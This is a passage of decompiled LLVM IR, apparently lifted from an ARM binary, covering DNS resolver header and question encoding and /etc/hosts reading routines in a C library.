  %v0_15264 = load i32, i32* @ip, align 4
  %v1_15264 = add i32 %v0_15264, 33
  %v2_15264 = inttoptr i32 %v1_15264 to i8*
  %v3_15264 = load i8, i8* %v2_15264, align 1
  %v2_15268 = load i32, i32* %lr.global-to-local, align 4
  %v3_15268 = add i32 %v2_15268, 4
  %v4_15268 = inttoptr i32 %v3_15268 to i8*
  store i8 %v3_15264, i8* %v4_15268, align 1
  %v0_1526c = load i32, i32* @ip, align 4
  %v1_1526c = add i32 %v0_1526c, 32
  %v2_1526c = inttoptr i32 %v1_1526c to i32*
  %v3_1526c = load i32, i32* %v2_1526c, align 4
  %v1_15270 = trunc i32 %v3_1526c to i8
  %v2_15270 = load i32, i32* %lr.global-to-local, align 4
  %v3_15270 = add i32 %v2_15270, 5
  %v4_15270 = inttoptr i32 %v3_15270 to i8*
  store i8 %v1_15270, i8* %v4_15270, align 1
  %v0_15274 = load i32, i32* @ip, align 4
  %v1_15274 = add i32 %v0_15274, 37
  %v2_15274 = inttoptr i32 %v1_15274 to i8*
  %v3_15274 = load i8, i8* %v2_15274, align 1
  %v2_15278 = load i32, i32* %lr.global-to-local, align 4
  %v3_15278 = add i32 %v2_15278, 6
  %v4_15278 = inttoptr i32 %v3_15278 to i8*
  store i8 %v3_15274, i8* %v4_15278, align 1
  %v0_1527c = load i32, i32* @ip, align 4
  %v1_1527c = add i32 %v0_1527c, 36
  %v2_1527c = inttoptr i32 %v1_1527c to i32*
  %v3_1527c = load i32, i32* %v2_1527c, align 4
  %v1_15280 = trunc i32 %v3_1527c to i8
  %v2_15280 = load i32, i32* %lr.global-to-local, align 4
  %v3_15280 = add i32 %v2_15280, 7
  %v4_15280 = inttoptr i32 %v3_15280 to i8*
  store i8 %v1_15280, i8* %v4_15280, align 1
  %v0_15284 = load i32, i32* @ip, align 4
  %v1_15284 = add i32 %v0_15284, 41
  %v2_15284 = inttoptr i32 %v1_15284 to i8*
  %v3_15284 = load i8, i8* %v2_15284, align 1
  %v2_15288 = load i32, i32* %lr.global-to-local, align 4
  %v3_15288 = add i32 %v2_15288, 8
  %v4_15288 = inttoptr i32 %v3_15288 to i8*
  store i8 %v3_15284, i8* %v4_15288, align 1
  %v0_1528c = load i32, i32* @ip, align 4
  %v1_1528c = add i32 %v0_1528c, 40
  %v2_1528c = inttoptr i32 %v1_1528c to i32*
  %v3_1528c = load i32, i32* %v2_1528c, align 4
  %v1_15290 = trunc i32 %v3_1528c to i8
  %v2_15290 = load i32, i32* %lr.global-to-local, align 4
  %v3_15290 = add i32 %v2_15290, 9
  %v4_15290 = inttoptr i32 %v3_15290 to i8*
  store i8 %v1_15290, i8* %v4_15290, align 1
  %v0_15294 = load i32, i32* @ip, align 4
  %v1_15294 = add i32 %v0_15294, 45
  %v2_15294 = inttoptr i32 %v1_15294 to i8*
  %v3_15294 = load i8, i8* %v2_15294, align 1
  %v2_15298 = load i32, i32* %lr.global-to-local, align 4
  %v3_15298 = add i32 %v2_15298, 10
  %v4_15298 = inttoptr i32 %v3_15298 to i8*
  store i8 %v3_15294, i8* %v4_15298, align 1
  %v0_1529c = load i32, i32* @ip, align 4
  %v1_1529c = add i32 %v0_1529c, 44
  %v2_1529c = inttoptr i32 %v1_1529c to i32*
  %v3_1529c = load i32, i32* %v2_1529c, align 4
  %v1_152a0 = trunc i32 %v3_1529c to i8
  %v2_152a0 = load i32, i32* %lr.global-to-local, align 4
  %v3_152a0 = add i32 %v2_152a0, 11
  %v4_152a0 = inttoptr i32 %v3_152a0 to i8*
  store i8 %v1_152a0, i8* %v4_152a0, align 1
  %v2_152a8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_152a8

dec_label_pc_152a8:                               ; preds = %entry, %bb17
  %v2_152a8 = phi i32 [ %v2_152a8.pre, %bb17 ], [ %v0_151c8, %entry ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %entry ]
  store i32 %v2_152a8, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_151ec, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 37, { 2, 0, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_152a8, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_152b0 = load i8, i8* %arg1, align 1
  %v4_152b0 = zext i8 %v3_152b0 to i32
  %v2_152b4 = add i32 %tmp, 1
  %v3_152b4 = inttoptr i32 %v2_152b4 to i8*
  %v4_152b4 = load i8, i8* %v3_152b4, align 1
  %v5_152b4 = zext i8 %v4_152b4 to i32
  %v4_152b8 = mul nuw nsw i32 %v4_152b0, 256
  %v5_152b8 = or i32 %v5_152b4, %v4_152b8
  %v2_152bc = inttoptr i32 %arg2 to i32*
  store i32 %v5_152b8, i32* %v2_152bc, align 4
  %v2_152c0 = add i32 %tmp, 2
  %v3_152c0 = inttoptr i32 %v2_152c0 to i8*
  %v4_152c0 = load i8, i8* %v3_152c0, align 1
  %tmp3 = icmp slt i8 %v4_152c0, 0
  %v3_152c4 = zext i1 %tmp3 to i32
  %v2_152c8 = add i32 %arg2, 4
  %v3_152c8 = inttoptr i32 %v2_152c8 to i32*
  store i32 %v3_152c4, i32* %v3_152c8, align 4
  %v4_152cc = load i8, i8* %v3_152c0, align 1
  %div = udiv i8 %v4_152cc, 8
  %tmp4 = urem i8 %div, 16
  %v1_152d4 = zext i8 %tmp4 to i32
  %v2_152d8 = add i32 %arg2, 8
  %v3_152d8 = inttoptr i32 %v2_152d8 to i32*
  store i32 %v1_152d4, i32* %v3_152d8, align 4
  %v4_152dc = load i8, i8* %v3_152c0, align 1
  %div1 = udiv i8 %v4_152dc, 4
  %tmp5 = urem i8 %div1, 2
  %v1_152e4 = zext i8 %tmp5 to i32
  %v2_152e8 = add i32 %arg2, 12
  %v3_152e8 = inttoptr i32 %v2_152e8 to i32*
  store i32 %v1_152e4, i32* %v3_152e8, align 4
  %v4_152ec = load i8, i8* %v3_152c0, align 1
  %div2 = udiv i8 %v4_152ec, 2
  %tmp6 = urem i8 %div2, 2
  %v1_152f4 = zext i8 %tmp6 to i32
  %v2_152f8 = add i32 %arg2, 16
  %v3_152f8 = inttoptr i32 %v2_152f8 to i32*
  store i32 %v1_152f4, i32* %v3_152f8, align 4
  %v4_152fc = load i8, i8* %v3_152c0, align 1
  %tmp7 = urem i8 %v4_152fc, 2
  %v1_15300 = zext i8 %tmp7 to i32
  %v2_15304 = add i32 %arg2, 20
  %v3_15304 = inttoptr i32 %v2_15304 to i32*
  store i32 %v1_15300, i32* %v3_15304, align 4
  %v2_15308 = add i32 %tmp, 3
  %v3_15308 = inttoptr i32 %v2_15308 to i8*
  %v4_15308 = load i8, i8* %v3_15308, align 1
  %tmp8 = icmp slt i8 %v4_15308, 0
  %v3_1530c = zext i1 %tmp8 to i32
  %v2_15310 = add i32 %arg2, 24
  %v3_15310 = inttoptr i32 %v2_15310 to i32*
  store i32 %v3_1530c, i32* %v3_15310, align 4
  %v4_15314 = load i8, i8* %v3_15308, align 1
  %tmp9 = urem i8 %v4_15314, 16
  %v1_15318 = zext i8 %tmp9 to i32
  %v2_1531c = add i32 %arg2, 28
  %v3_1531c = inttoptr i32 %v2_1531c to i32*
  store i32 %v1_15318, i32* %v3_1531c, align 4
  %v2_15320 = add i32 %tmp, 4
  %v3_15320 = inttoptr i32 %v2_15320 to i8*
  %v4_15320 = load i8, i8* %v3_15320, align 1
  %v5_15320 = zext i8 %v4_15320 to i32
  %v2_15324 = add i32 %tmp, 5
  %v3_15324 = inttoptr i32 %v2_15324 to i8*
  %v4_15324 = load i8, i8* %v3_15324, align 1
  %v5_15324 = zext i8 %v4_15324 to i32
  %v4_15328 = mul nuw nsw i32 %v5_15320, 256
  %v5_15328 = or i32 %v5_15324, %v4_15328
  %v2_1532c = add i32 %arg2, 32
  %v3_1532c = inttoptr i32 %v2_1532c to i32*
  store i32 %v5_15328, i32* %v3_1532c, align 4
  %v2_15330 = add i32 %tmp, 6
  %v3_15330 = inttoptr i32 %v2_15330 to i8*
  %v4_15330 = load i8, i8* %v3_15330, align 1
  %v5_15330 = zext i8 %v4_15330 to i32
  %v2_15334 = add i32 %tmp, 7
  %v3_15334 = inttoptr i32 %v2_15334 to i8*
  %v4_15334 = load i8, i8* %v3_15334, align 1
  %v5_15334 = zext i8 %v4_15334 to i32
  %v4_15338 = mul nuw nsw i32 %v5_15330, 256
  %v5_15338 = or i32 %v5_15334, %v4_15338
  %v2_1533c = add i32 %arg2, 36
  %v3_1533c = inttoptr i32 %v2_1533c to i32*
  store i32 %v5_15338, i32* %v3_1533c, align 4
  %v2_15340 = add i32 %tmp, 8
  %v3_15340 = inttoptr i32 %v2_15340 to i8*
  %v4_15340 = load i8, i8* %v3_15340, align 1
  %v5_15340 = zext i8 %v4_15340 to i32
  %v2_15344 = add i32 %tmp, 9
  %v3_15344 = inttoptr i32 %v2_15344 to i8*
  %v4_15344 = load i8, i8* %v3_15344, align 1
  %v5_15344 = zext i8 %v4_15344 to i32
  %v4_15348 = mul nuw nsw i32 %v5_15340, 256
  %v5_15348 = or i32 %v5_15344, %v4_15348
  %v2_1534c = add i32 %arg2, 40
  %v3_1534c = inttoptr i32 %v2_1534c to i32*
  store i32 %v5_15348, i32* %v3_1534c, align 4
  %v2_15350 = add i32 %tmp, 11
  %v3_15350 = inttoptr i32 %v2_15350 to i8*
  %v4_15350 = load i8, i8* %v3_15350, align 1
  %v5_15350 = zext i8 %v4_15350 to i32
  %v2_15354 = add i32 %tmp, 10
  %v3_15354 = inttoptr i32 %v2_15354 to i8*
  %v4_15354 = load i8, i8* %v3_15354, align 1
  %v5_15354 = zext i8 %v4_15354 to i32
  %v4_15358 = mul nuw nsw i32 %v5_15354, 256
  %v5_15358 = or i32 %v4_15358, %v5_15350
  %v2_1535c = add i32 %arg2, 44
  %v3_1535c = inttoptr i32 %v2_1535c to i32*
  store i32 %v5_15358, i32* %v3_1535c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 11, { 16, 17, 4, 9, 1, 2, 3, 10, 11, 12, 13, 14, 15, 0, 5, 19, 18, 6, 7, 8, 20 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5, 12 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15364 = load i32, i32* @r4, align 4
  store i32 %v3_15364, i32* %stack_var_-16, align 4
  %v9_15364 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_1536c = load i32, i32* %arg1, align 4
  store i32 %v2_1536c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_15378 = inttoptr i32 %v2_1536c to i8*
  %v2_15378 = call i32 @__encode_dotted(i8* %v1_15378)
  store i32 %v2_15378, i32* %r0.global-to-local, align 4
  %v1_1537c = icmp slt i32 %v2_15378, 0
  br i1 %v1_1537c, label %dec_label_pc_153bc, label %dec_label_pc_15384

dec_label_pc_15384:                               ; preds = %entry
  %v1_15384 = load i32, i32* @r5, align 4
  %v2_15384 = sub i32 %v1_15384, %v2_15378
  %v7_1538c = icmp slt i32 %v2_15384, 4
  br i1 %v7_1538c, label %bb, label %dec_label_pc_15394

bb:                                               ; preds = %dec_label_pc_15384
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_153bc

dec_label_pc_15394:                               ; preds = %dec_label_pc_15384
  %v0_15394 = load i32, i32* @r4, align 4
  %v1_15394 = add i32 %v0_15394, 5
  %v2_15394 = inttoptr i32 %v1_15394 to i8*
  %v3_15394 = load i8, i8* %v2_15394, align 1
  %v2_15398 = load i32, i32* @r6, align 4
  %v4_15398 = add i32 %v2_15398, %v2_15378
  %v5_15398 = inttoptr i32 %v4_15398 to i8*
  store i8 %v3_15394, i8* %v5_15398, align 1
  %v0_1539c = load i32, i32* @r4, align 4
  %v1_1539c = add i32 %v0_1539c, 4
  %v2_1539c = inttoptr i32 %v1_1539c to i32*
  %v3_1539c = load i32, i32* %v2_1539c, align 4
  %v0_153a0 = load i32, i32* @r6, align 4
  %v1_153a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_153a0 = add i32 %v1_153a0, %v0_153a0
  store i32 %v2_153a0, i32* %r2.global-to-local, align 4
  %v1_153a4 = trunc i32 %v3_1539c to i8
  %v3_153a4 = add i32 %v2_153a0, 1
  %v4_153a4 = inttoptr i32 %v3_153a4 to i8*
  store i8 %v1_153a4, i8* %v4_153a4, align 1
  %v0_153a8 = load i32, i32* @r4, align 4
  %v1_153a8 = add i32 %v0_153a8, 9
  %v2_153a8 = inttoptr i32 %v1_153a8 to i8*
  %v3_153a8 = load i8, i8* %v2_153a8, align 1
  %v2_153ac = load i32, i32* %r2.global-to-local, align 4
  %v3_153ac = add i32 %v2_153ac, 2
  %v4_153ac = inttoptr i32 %v3_153ac to i8*
  store i8 %v3_153a8, i8* %v4_153ac, align 1
  %v0_153b0 = load i32, i32* @r4, align 4
  %v1_153b0 = add i32 %v0_153b0, 8
  %v2_153b0 = inttoptr i32 %v1_153b0 to i32*
  %v3_153b0 = load i32, i32* %v2_153b0, align 4
  %v1_153b4 = trunc i32 %v3_153b0 to i8
  %v2_153b4 = load i32, i32* %r2.global-to-local, align 4
  %v3_153b4 = add i32 %v2_153b4, 3
  %v4_153b4 = inttoptr i32 %v3_153b4 to i8*
  store i8 %v1_153b4, i8* %v4_153b4, align 1
  %v0_153b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_153b8 = add i32 %v0_153b8, 4
  store i32 %v1_153b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_153bc

dec_label_pc_153bc:                               ; preds = %bb, %entry, %dec_label_pc_15394
  %v1_153c0 = phi i32 [ -1, %bb ], [ %v2_15378, %entry ], [ %v1_153b8, %dec_label_pc_15394 ]
  %v2_153bc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_153bc, i32* @r4, align 4
  store i32 %v9_15364, i32* @r6, align 4
  ret i32 %v1_153c0

; uselistorder directives
  uselistorder i32 %v2_15378, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder label %dec_label_pc_153bc, { 2, 0, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -33980), i32* @r0, align 4
  %v1_153dc = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -33980))
  ret i32 %v1_153dc

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 0, 2, 1 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_153f4 = load i32, i32* @r4, align 4
  %v9_153f4 = load i32, i32* @r6, align 4
  %v12_153f4 = load i32, i32* @r7, align 4
  %v15_153f4 = load i32, i32* @r8, align 4
  %v18_153f4 = load i32, i32* @sb, align 4
  %v24_153f4 = load i32, i32* @fp, align 4
  store i32 %tmp10, i32* @r5, align 4
  store i32 %tmp9, i32* @lr, align 4
  store i32 -1, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r4, align 4
  %v2_15414 = inttoptr i32 %tmp9 to i32*
  store i32 -1, i32* %v2_15414, align 4
  %v0_15418 = load i32, i32* @r0, align 4
  store i32 %v0_15418, i32* @r6, align 4
  %v0_1541c = load i32, i32* @r1, align 4
  %v0_15420 = load i32, i32* @r2, align 4
  store i32 %v0_15420, i32* @r8, align 4
  %v0_15424 = load i32, i32* @r3, align 4
  store i32 %v0_15424, i32* @fp, align 4
  %v3_15428 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_15428, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp10, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_15434

.thread:                                          ; preds = %entry
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_155ec

dec_label_pc_15434:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_15438 = icmp eq i32 %v0_15418, 0
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_15438, label %dec_label_pc_15444, label %dec_label_pc_1546c

dec_label_pc_15444:                               ; preds = %dec_label_pc_15434
  %v0_15444 = call i32 @__open_etc_hosts()
  store i32 %v0_15444, i32* @r6, align 4
  %v2_15448 = icmp eq i32 %v0_15444, 0
  br i1 %v2_15448, label %dec_label_pc_15450, label %dec_label_pc_1546c

dec_label_pc_15450:                               ; preds = %dec_label_pc_15444
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  store i32 52872, i32* %r3.global-to-local, align 4
  %v2_15458 = inttoptr i32 %tmp7 to i32*
  store i32 0, i32* %v2_15458, align 4
  %v0_1545c = call i32 @__aeabi_read_tp()
  %v3_15460 = load i16, i16* @global_var_222f0.75, align 2
  %v4_15460 = sext i16 %v3_15460 to i32
  store i32 %v4_15460, i32* %r3.global-to-local, align 4
  %v2_15464 = add i32 %v4_15460, %v0_1545c
  %v3_15464 = inttoptr i32 %v2_15464 to i32*
  %v4_15464 = load i32, i32* %v3_15464, align 4
  store i32 %v4_15464, i32* @sb, align 4
  br label %dec_label_pc_155ec

dec_label_pc_1546c:                               ; preds = %dec_label_pc_15444, %dec_label_pc_15434
  %v1_1548c = phi i32 [ %v0_15444, %dec_label_pc_15444 ], [ %v0_15418, %dec_label_pc_15434 ]
  %v0_15470 = load i32, i32* @r4, align 4
  %v2_15470 = add i32 %v0_15470, -33968
  store i32 %v2_15470, i32* @r4, align 4
  %v2_15474 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp6, i32* %ip.global-to-local, align 4
  store i32 %tmp6, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_1548c = add i32 %v1_1548c, 8
  %v3_1548c = inttoptr i32 %v2_1548c to i32*
  store i32 48, i32* %v3_1548c, align 4
  store i32 %tmp9, i32* %r3.global-to-local, align 4
  %v0_15494 = load i32, i32* @r5, align 4
  %v1_15494 = add i32 %v0_15494, -48
  store i32 %v1_15494, i32* %r1.global-to-local, align 4
  %v0_15498 = load i32, i32* %ip.global-to-local, align 4
  %v1_15498 = add i32 %v0_15498, 24
  store i32 %v1_15498, i32* @ip, align 4
  %v0_1549c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1549c, i32* @sb, align 4
  %v0_154a0 = load i32, i32* @lr, align 4
  %v1_154a0 = add i32 %v0_154a0, 32
  store i32 %v1_154a0, i32* @sl, align 4
  %v1_154a4 = load i32, i32* @r6, align 4
  %v2_154a4 = add i32 %v1_154a4, 16
  %v3_154a4 = inttoptr i32 %v2_154a4 to i32*
  store i32 %v1_15494, i32* %v3_154a4, align 4
  %v0_154a8 = load i32, i32* @r4, align 4
  %v0_154ac = load i32, i32* @ip, align 4
  store i32 %v0_154ac, i32* %stack_var_-64, align 4
  %v0_154b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_154b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_154b0 = inttoptr i32 %v1_154b0 to i32*
  store i32 %v0_154b0, i32* %v2_154b0, align 4
  %v0_154b4 = load i32, i32* @lr, align 4
  %v1_154b4 = load i32, i32* @r6, align 4
  %v2_154b4 = add i32 %v1_154b4, 4
  %v3_154b4 = inttoptr i32 %v2_154b4 to i32*
  store i32 %v0_154b4, i32* %v3_154b4, align 4
  %v2_154e4 = inttoptr i32 %v0_1541c to i8*
  br label %dec_label_pc_155c0

dec_label_pc_154bc:                               ; preds = %dec_label_pc_155c0
  %v3_154bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_154bc, i32* %r1.global-to-local, align 4
  %v0_154c0 = load i32, i32* @fp, align 4
  %v7_154c0 = icmp eq i32 %v0_154c0, 1
  %v1_154c4 = add i32 %v3_154bc, 4
  store i32 %v1_154c4, i32* @r5, align 4
  %v1_154c8 = load i32, i32* @r7, align 4
  %v2_154c8 = add i32 %v1_154c8, 4
  %v3_154c8 = inttoptr i32 %v2_154c8 to i32*
  store i32 %v1_154c4, i32* %v3_154c8, align 4
  br i1 %v7_154c0, label %dec_label_pc_155ec, label %dec_label_pc_154d0

dec_label_pc_154d0:                               ; preds = %dec_label_pc_154bc
  %v0_154d0 = load i32, i32* @fp, align 4
  %v7_154d0 = icmp eq i32 %v0_154d0, 2
  br i1 %v7_154d0, label %dec_label_pc_154dc, label %dec_label_pc_15510.preheader

dec_label_pc_15510.preheader:                     ; preds = %dec_label_pc_154d0
  br label %dec_label_pc_154f4

dec_label_pc_154dc:                               ; preds = %dec_label_pc_154d0
  %v0_154dc = load i32, i32* %r1.global-to-local, align 4
  %v1_154dc = inttoptr i32 %v0_154dc to i32*
  %v2_154dc = load i32, i32* %v1_154dc, align 4
  store i32 %v2_154dc, i32* @r1, align 4
  %v3_154e4 = call i32 @__GI_strcoll(i8* %v2_154e4, i32 %v2_154dc)
  %v2_154e8 = icmp eq i32 %v3_154e4, 0
  br i1 %v2_154e8, label %dec_label_pc_15520, label %dec_label_pc_155c0

dec_label_pc_154f4:                               ; preds = %dec_label_pc_15510.preheader, %dec_label_pc_15510.backedge
  %v0_154fc = phi i32 [ 0, %dec_label_pc_15510.preheader ], [ %v0_15510.be, %dec_label_pc_15510.backedge ]
  %v0_154f4 = load i32, i32* @r5, align 4
  %v4_154f4 = mul i32 %v0_154fc, 4
  %v5_154f4 = add i32 %v4_154f4, %v0_154f4
  %v6_154f4 = inttoptr i32 %v5_154f4 to i32*
  %v7_154f4 = load i32, i32* %v6_154f4, align 4
  store i32 %v7_154f4, i32* %r3.global-to-local, align 4
  store i32 %v7_154f4, i32* %r1.global-to-local, align 4
  %v2_154f8 = icmp eq i32 %v7_154f4, 0
  %v1_154fc = add i32 %v0_154fc, 1
  store i32 %v1_154fc, i32* @r4, align 4
  br i1 %v2_154f8, label %dec_label_pc_15510.backedge, label %dec_label_pc_15504

dec_label_pc_15510.backedge:                      ; preds = %dec_label_pc_154f4, %dec_label_pc_15510thread-pre-split
  %v0_15510.be = phi i32 [ %v0_15510.pr, %dec_label_pc_15510thread-pre-split ], [ %v1_154fc, %dec_label_pc_154f4 ]
  %v7_15518 = icmp sgt i32 %v0_15510.be, 3
  br i1 %v7_15518, label %dec_label_pc_155c0, label %dec_label_pc_154f4

dec_label_pc_15504:                               ; preds = %dec_label_pc_154f4
  %v3_15504 = call i32 @__GI_strcasecmp(i8* %v2_154e4, i32 %v7_154f4)
  %v2_15508 = icmp eq i32 %v3_15504, 0
  br i1 %v2_15508, label %dec_label_pc_15520, label %dec_label_pc_15510thread-pre-split

dec_label_pc_15510thread-pre-split:               ; preds = %dec_label_pc_15504
  %v0_15510.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_15510.backedge

dec_label_pc_15520:                               ; preds = %dec_label_pc_15504, %dec_label_pc_154dc
  %v0_15520 = load i32, i32* @r5, align 4
  %v1_15520 = inttoptr i32 %v0_15520 to i32*
  %v2_15520 = load i32, i32* %v1_15520, align 4
  store i32 %v2_15520, i32* %r3.global-to-local, align 4
  %v4_15520 = add i32 %v0_15520, 4
  store i32 %v4_15520, i32* @r5, align 4
  %v2_15524 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_15524, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_1552c = load i32, i32* @r7, align 4
  %v2_1552c = inttoptr i32 %v1_1552c to i32*
  store i32 %v2_15520, i32* %v2_1552c, align 4
  %v0_15530 = load i32, i32* @lr, align 4
  %v1_15530 = load i32, i32* @ip, align 4
  %v2_15530 = add i32 %v1_15530, 4
  %v3_15530 = inttoptr i32 %v2_15530 to i32*
  store i32 %v0_15530, i32* %v3_15530, align 4
  store i32 %tmp6, i32* %r2.global-to-local, align 4
  %v0_15538 = load i32, i32* @r8, align 4
  %v7_15538 = icmp eq i32 %v0_15538, 2
  %v0_1553c = load i32, i32* @r5, align 4
  %v1_1553c = load i32, i32* @r7, align 4
  %v2_1553c = add i32 %v1_1553c, 4
  %v3_1553c = inttoptr i32 %v2_1553c to i32*
  store i32 %v0_1553c, i32* %v3_1553c, align 4
  %v0_15540 = load i32, i32* @ip, align 4
  %v1_15540 = load i32, i32* @r7, align 4
  %v2_15540 = add i32 %v1_15540, 16
  %v3_15540 = inttoptr i32 %v2_15540 to i32*
  store i32 %v0_15540, i32* %v3_15540, align 4
  %v0_15544 = load i32, i32* @sl, align 4
  %v1_15544 = load i32, i32* %r2.global-to-local, align 4
  %v2_15544 = add i32 %v1_15544, 24
  %v3_15544 = inttoptr i32 %v2_15544 to i32*
  store i32 %v0_15544, i32* %v3_15544, align 4
  br i1 %v7_15538, label %dec_label_pc_1554c, label %dec_label_pc_1557c

dec_label_pc_1554c:                               ; preds = %dec_label_pc_15520
  %v3_1554c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1554c, i32* %r3.global-to-local, align 4
  %v0_15550 = load i32, i32* @r8, align 4
  %v1_15554 = inttoptr i32 %v3_1554c to i32*
  %v2_15554 = load i32, i32* %v1_15554, align 4
  store i32 %v2_15554, i32* %r1.global-to-local, align 4
  %v0_15558 = load i32, i32* @sl, align 4
  store i32 %v0_15558, i32* %r2.global-to-local, align 4
  %v3_1555c = inttoptr i32 %v2_15554 to i8*
  %v4_1555c = call i32 @inet_pton(i32 %v0_15550, i8* %v3_1555c, i32 %v0_15558)
  %tmp23 = icmp slt i32 %v4_1555c, 1
  br i1 %tmp23, label %dec_label_pc_155bc, label %dec_label_pc_15568

dec_label_pc_15568:                               ; preds = %dec_label_pc_1554c
  %v0_1556c = load i32, i32* @r7, align 4
  %v2_1556c = inttoptr i32 %tmp7 to i32*
  store i32 %v0_1556c, i32* %v2_1556c, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_15574 = load i32, i32* @r8, align 4
  %v1_15574 = load i32, i32* @r7, align 4
  %v2_15574 = add i32 %v1_15574, 8
  %v3_15574 = inttoptr i32 %v2_15574 to i32*
  store i32 %v0_15574, i32* %v3_15574, align 4
  %v0_155b4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_155b0

dec_label_pc_1557c:                               ; preds = %dec_label_pc_15520
  %v0_1557c = load i32, i32* @r8, align 4
  %v7_1557c = icmp eq i32 %v0_1557c, 10
  br i1 %v7_1557c, label %dec_label_pc_15584, label %dec_label_pc_155bc

dec_label_pc_15584:                               ; preds = %dec_label_pc_1557c
  %v3_15584 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_15584, i32* %r3.global-to-local, align 4
  %v1_1558c = inttoptr i32 %v3_15584 to i32*
  %v2_1558c = load i32, i32* %v1_1558c, align 4
  store i32 %v2_1558c, i32* %r1.global-to-local, align 4
  %v0_15590 = load i32, i32* @sl, align 4
  store i32 %v0_15590, i32* %r2.global-to-local, align 4
  %v3_15594 = inttoptr i32 %v2_1558c to i8*
  %v4_15594 = call i32 @inet_pton(i32 10, i8* %v3_15594, i32 %v0_15590)
  %tmp24 = icmp slt i32 %v4_15594, 1
  br i1 %tmp24, label %dec_label_pc_155bc, label %dec_label_pc_155a0

dec_label_pc_155a0:                               ; preds = %dec_label_pc_15584
  store i32 %tmp7, i32* @ip, align 4
  %v0_155a4 = load i32, i32* @r8, align 4
  %v1_155a4 = load i32, i32* @r7, align 4
  %v2_155a4 = add i32 %v1_155a4, 8
  %v3_155a4 = inttoptr i32 %v2_155a4 to i32*
  store i32 %v0_155a4, i32* %v3_155a4, align 4
  %v0_155a8 = load i32, i32* @r7, align 4
  %v1_155a8 = load i32, i32* @ip, align 4
  %v2_155a8 = inttoptr i32 %v1_155a8 to i32*
  store i32 %v0_155a8, i32* %v2_155a8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_155b0

dec_label_pc_155b0:                               ; preds = %dec_label_pc_15568, %dec_label_pc_155a0
  %v0_155b4 = phi i32 [ %v0_155b4.pre, %dec_label_pc_15568 ], [ 16, %dec_label_pc_155a0 ]
  store i32 0, i32* @sb, align 4
  %v1_155b4 = load i32, i32* @r7, align 4
  %v2_155b4 = add i32 %v1_155b4, 12
  %v3_155b4 = inttoptr i32 %v2_155b4 to i32*
  store i32 %v0_155b4, i32* %v3_155b4, align 4
  br label %dec_label_pc_155e4

dec_label_pc_155bc:                               ; preds = %dec_label_pc_1557c, %dec_label_pc_15584, %dec_label_pc_1554c
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_155c0

